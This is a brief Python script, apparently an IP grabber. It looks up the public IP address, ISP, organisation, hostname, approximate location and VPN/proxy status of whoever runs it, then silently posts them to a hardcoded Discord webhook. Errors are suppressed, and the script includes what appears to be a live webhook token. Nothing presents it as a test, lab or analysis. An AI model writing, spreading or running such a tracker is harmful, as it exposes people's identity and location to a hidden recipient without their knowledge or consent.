import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn"

def get_ipinfo():
    try:
        resp = requests.get("http://ip-api.com/json/", timeout=10)
        resp.raise_for_status()
        return resp.json()
    except Exception:
        return None

def send_ip_to_discord(message):
    try:
        requests.post(WEBHOOK_URL, json={"content": message})
    except requests.RequestException:
        pass

def main():
    info = get_ipinfo()
    if not info or info.get("status") != "success":
        return
    ip = info.get("query", "Unknown")
    org = info.get("org", "Unknown")
    isp = info.get("isp", "Unknown")
    hostname = info.get("reverse", "Unknown")
    city = info.get("city", "Unknown")
    region = info.get("regionName", "Unknown")
    country = info.get("country", "Unknown")
    vpn = info.get("mobile", False) or info.get("proxy", False) or info.get("hosting", False)
    details = [
        f"User's public IP address: {ip}{' (VPN/Proxy/Hosting)' if vpn else ''}",
        f"ISP: {isp}",
        f"Org: {org}",
        f"Hostname: {hostname}",
        f"Location: {city}, {region}, {country}"
    ]
    message = "\n".join(details)
    send_ip_to_discord(message)

if __name__ == "__main__":
    main()
